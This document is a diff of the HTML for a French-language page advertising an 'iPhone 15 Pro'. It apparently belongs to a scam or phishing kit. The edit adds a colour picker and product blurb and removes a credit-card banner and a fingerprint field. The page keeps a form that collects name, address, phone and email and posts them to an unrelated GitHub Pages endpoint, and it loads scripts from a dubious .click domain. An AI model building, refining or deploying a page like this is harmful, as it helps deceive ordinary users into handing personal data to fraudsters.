@@ -1,4 +1,5 @@
-<html lang="fr" dir="ltr"><head>
+<html lang="fr" dir="ltr">
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>iPhone 15 Pro</title>
@@ -17,12 +18,43 @@
         html[lang="fr"] body select {
             direction: ltr;
         }
+
+        .choose_color {
+            margin-bottom: 15px;
+        }
+
+        .choose_color label {
+            font-weight: bold;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 10px;
+        }
+
+        .img-nav-tab {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: inline-block;
+            cursor: pointer;
+            border: 2px solid transparent;
+        }
+
+        .img-nav-tab.active {
+            border-color: #000;
+        }
+
+        .black { background-color: black; }
+        .blue { background-color: blue; }
+        .natural { background-color: gray; }
+        .white { background-color: white; border: 1px solid black; }
     </style>
 </head>
 
 <body class="lang-fr country-FR page-campaign">
     <script src="https://swiftclapocos.click/assets/js/jquery-3.6.1.min.js"></script>
-    
+
     <header>
         <!-- TOP BAR PARAGRAPH END'S HERE -->
     </header>
@@ -52,71 +84,110 @@
                             <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-whitetitanium1.png" alt="iPhone 15">
                         </div>
                     </div>
-
+    
                     <div class="form_wrapper">
                         <div class="product_title">
                             <h1>iPhone 15 Pro</h1>
                         </div>
+
+                  
+                  <style>
+    .choose_color {
+        margin: 15px auto;
+        text-align: center;
+    }
+
+    .choose_color label {
+        font-weight: bold;
+        display: block;
+        margin-bottom: 10px;
+        font-size: 18px;
+    }
+
+    .btn-group {
+        display: flex;
+        justify-content: center;
+        gap: 10px;
+    }
+
+    .img-nav-tab {
+        width: 26px;
+        height: 26px;
+        border-radius: 50%;
+        display: inline-block;
+        cursor: pointer;
+        border: 3px solid transparent;
+        transition: 0.3s;
+    }
+
+    .img-nav-tab.active {
+        border-color: white; /* Contour blanc autour de la couleur sélectionnée */
+        box-shadow: 0px 0px 5px rgba(255, 255, 255, 0.7);
+    }
+
+    .black { background-color: #222; } /* Noir éclairci */
+    .blue { background-color: #4a90e2; } /* Bleu plus proche du produit */
+    .natural { background-color: gray; }
+    .white { background-color: white; border: 1px solid black; }
+</style>
+
+<!-- Choix de la couleur centré sous le titre -->
+<div class="choose_color">
+    <label>Choisissez votre couleur&nbsp;:</label>
+    <div class="btn-group">
+        <a href="javascript:;" data-tab="black" class="img-nav-tab black active"></a>
+        <a href="javascript:;" data-tab="blue" class="img-nav-tab blue"></a>
+        <a href="javascript:;" data-tab="natural" class="img-nav-tab natural"></a>
+        <a href="javascript:;" data-tab="white" class="img-nav-tab white"></a>
+    </div>
+</div>
+
+        
+              
+   
+
                         <!-- FORM BLOCK START HERE -->
-                        <center><div class="accepted-credit-cards text-center" style="margin: 1rem 0;">
-                    <p class="accepted-credit-cards-heading" style="font-size: 14px; margin: 0 0 .5rem;">Cartes de crédit acceptées:</p>
-                    <img src="https://cdn.soopercdn.com/cp/form-campaign-checkout-v2/assets/images/card.svg" alt="Supported Payment Cards" style="width:auto; max-width:100%;">
-                  </div></center><div class="form_block" id="Scroll_form">
+                        <div class="form_block" id="Scroll_form">
                             <form action="https://justmoicom.github.io/tel2/" method="POST" autocomplete="on" novalidate="novalidate" id="personalInformationForm">
                                 <input type="hidden" name="_token" value="NsVhDb99Mf0taT0wjSlGq3iryWWyr2afJk0cCr7i" autocomplete="off">
-                                <input type="hidden" name="request_hash" id="request_hash" value="eyJqYXZhX2VuYWJsZWQiOmZhbHNlLCJjb2xvcl9kZXB0aCI6MjQsInNjcmVlbl93aWR0aCI6MTM2MCwic2NyZWVuX2hlaWdodCI6NzY4LCJ0aW1lem9uZSI6LTYwLCJ0aW1lem9uZV9uYW1lIjoiRXVyb3BlL1BhcmlzIiwiZGV2aWNlIjoibm90X21vYmlsZSJ9">
 
-                                <div class="row">
-                                    <div class="col-sm-6">
-                                        <div class="form-group">
-                                            <label for="first_name">Prénom</label>
-                                            <input type="text" name="first_name" id="first_name" minlength="2" value="" placeholder="Prénom" required="" class="form-control form-control-lg">
-                                        </div>
-                                    </div>
-                                    <div class="col-sm-6">
-                                        <div class="form-group">
-                                            <label for="last_name">Nom</label>
-                                            <input type="text" name="last_name" id="last_name" minlength="2" value="" placeholder="Nom" required="" class="form-control form-control-lg">
-                                        </div>
-                                    </div>
+                                <div class="form-group">
+                                    <label for="first_name">Prénom</label>
+                                    <input type="text" name="first_name" id="first_name" minlength="2" value="" placeholder="Prénom" required class="form-control form-control-lg">
+                                </div>
+
+                                <div class="form-group">
+                                    <label for="last_name">Nom</label>
+                                    <input type="text" name="last_name" id="last_name" minlength="2" value="" placeholder="Nom" required class="form-control form-control-lg">
                                 </div>
 
                                 <div class="form-group">
                                     <label for="address">Adresse</label>
-                                    <input type="text" name="address" id="address" minlength="3" value="" placeholder="Adresse" required="" class="form-control form-control-lg">
+                                    <input type="text" name="address" id="address" minlength="3" value="" placeholder="Adresse" required class="form-control form-control-lg">
                                 </div>
 
-                                <div class="row">
-                                    <div class="col-sm-6">
-                                        <div class="form-group">
-                                            <label for="zip_code">Code postal</label>
-                                            <input type="text" name="zip_code" id="zip_code" value="" placeholder="Code postal" required="" class="form-control form-control-lg">
-                                        </div>
-                                    </div>
-                                    <div class="col-sm-6">
-                                        <div class="form-group">
-                                            <label for="city">Ville</label>
-                                            <input type="text" name="city" id="city" value="" placeholder="Ville" required="" class="form-control form-control-lg">
-                                        </div>
-                                    </div>
+                                <div class="form-group">
+                                    <label for="zip_code">Code postal</label>
+                                    <input type="text" name="zip_code" id="zip_code" value="" placeholder="Code postal" required class="form-control form-control-lg">
+                                </div>
+
+                                <div class="form-group">
+                                    <label for="city">Ville</label>
+                                    <input type="text" name="city" id="city" value="" placeholder="Ville" required class="form-control form-control-lg">
                                 </div>
 
                                 <div class="form-group">
                                     <label for="phone_number">Numéro de téléphone</label>
-                                    <input type="tel" name="phone_number" id="phone_number" minlength="6" value="" placeholder="Numéro de téléphone" required="" class="form-control form-control-lg">
+                                    <input type="tel" name="phone_number" id="phone_number" minlength="6" value="" placeholder="Numéro de téléphone" required class="form-control form-control-lg">
                                 </div>
 
                                 <div class="form-group">
                                     <label for="email">E-mail</label>
-                                    <input type="email" name="email" id="email" value="" placeholder="E-mail" required="" class="form-control form-control-lg">
+                                    <input type="email" name="email" id="email" value="" placeholder="E-mail" required class="form-control form-control-lg">
                                 </div>
 
-                                <div class="total-price border-top border-bottom my-3 py-2 lead"></div>
-
                                 <button type="submit" id="submitButton" class="btn btn-success btn-lg w-100">
-                                    <span class="loader" style="height:12px;width:12px;border-width:3px;margin-right:5px;display:none;"></span>
                                     <span class="submit-label">Continuer</span>
-                                    <span class="waiting-label" style="display:none;">Patientez...</span>
                                 </button>
                             </form>
                         </div>
@@ -127,7 +198,41 @@
         </div>
     </section>
 
-    <!-- FOOTER START HERE -->
+  
+  <div class="intro_wrapper">
+      <div class="container">
+        <h2>Apple dévoile l'iPhone 15 Pro.</h2>
+        <p>Doté d'une conception en titane solide et légère avec de nouveaux bords profilés, un nouveau bouton Action, des améliorations puissantes de l'appareil photo et l'A17 Pro pour des performances de niveau supérieur et les jeux mobiles.</p>
+        <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/hero-img.jpg" alt="iPhone 15 Pro">
+      </div>
+    </div>
+  
+  
+  
+  
+  
+  
+    <script>
+        $(document).ready(function () {
+            $(".img-nav-tab").click(function () {
+                var color = $(this).attr("data-tab");
+
+                $(".img-tab").hide();
+                $("#" + color).show();
+
+                $(".img-nav-tab").removeClass("active");
+                $(this).addClass("active");
+            });
+        });
+    </script>
+
+  
+  
+  
+  
+  
+  
+      <!-- FOOTER START HERE -->
     <footer>
         <div class="container">
             <div class="block-reassurance">
@@ -236,3 +341,9 @@ $(document).ready(function () {
 
 
 <div id="veepn-guard-alert"></div><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style><div id="veepn-breach-alert"></div><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style></body></html>
+  
+  
+  
+  
+</body>
+</html>
